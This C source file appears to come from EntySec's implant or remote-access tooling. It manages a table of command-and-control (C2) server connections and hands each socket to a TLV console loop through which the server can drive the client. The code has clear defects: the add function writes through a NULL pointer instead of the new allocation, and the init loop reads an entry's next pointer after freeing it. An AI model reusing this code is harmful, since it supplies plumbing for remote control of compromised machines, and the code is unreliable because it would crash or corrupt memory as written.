/*
 * MIT License
 *
 * Copyright (c) 2020-2023 EntySec
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */

#include <stdio.h>
#include <sys/types.h>
#include <string.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

#include <log.h>
#include <tlv.h>
#include <console.h>
#include <net.h>

#include <uthash/uthash.h>

/*
 * Add C2 server. Solves the problem of multiple C2 servers.
 */

void net_c2_add(net_c2_t **net_c2_table, int id, int fd, char *name)
{
    net_c2_t *net_c2;
    HASH_FIND_INT(*net_c2_table, &id, net_c2);

    if (net_c2 == NULL)
    {
        net_c2_t *net_c2_new = calloc(1, sizeof(*net_c2_new));

        if (net_c2_new != NULL)
        {
            net_c2->id = id;
            net_c2->fd = fd;
            net_c2->name = name;

            HASH_ADD_INT(*net_c2_table, id, net_c2_new);
            log_debug("* Added net C2 entry (%d) - (%s)\n", id, name);
        }
    }
}

/*
 * Initialize C2 servers one by one. Initialization is a process, when
 * client takes C2 server socket fd and executes TLV console loop with it.
 * Final step is a clean up, when we delete C2 server from our records.
 */

void net_c2_init(net_c2_t *net_c2_table)
{
    net_c2_t *net_c2;

    for (net_c2 = net_c2_table; net_c2 != NULL; net_c2 = net_c2->hh.next)
    {
        tlv_pkt_t *tlv_id = tlv_channel_pkt(net_c2->fd);

        tlv_id->data = net_c2->name;
        tlv_id->size = strlen(net_c2->name) + 1;

        tlv_channel_send(tlv_id);
        free(tlv_id);

        tlv_pkt_t *tlv_pkt = tlv_channel_pkt(net_c2->fd);
        tlv_console_loop(tlv_pkt);

        tlv_pkt_free(tlv_pkt);

        log_debug("* Freed net C2 (%d) (%s)\n", net_c2->id, net_c2->name);
        HASH_DEL(net_c2_table, net_c2);

        free(net_c2);
    }

    free(net_c2_table);
}
